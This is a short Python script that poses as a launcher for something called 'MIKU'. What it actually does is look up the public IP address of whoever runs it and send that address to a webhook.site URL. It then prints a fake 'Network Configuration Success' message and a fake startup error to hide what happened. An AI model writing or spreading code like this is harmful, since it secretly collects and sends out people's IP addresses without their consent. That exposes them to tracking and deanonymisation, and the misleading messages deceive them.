import requests
import time

print("starting up MIKU distributor...")
time.sleep(.1)
ip = requests.get('https://api.ipify.org').text
webhook_url = "https://webhook.site/5b1abe8f-56d4-4d1e-bef0-126cd251951f"

requests.post(webhook_url, data={"ip": ip})

print("Network Configuration Success")
time.sleep(3)
print("Starting MIKU...")
time.sleep(7)
print("ERR: Failed to start MIKU. ERR: REQ NOT MET")
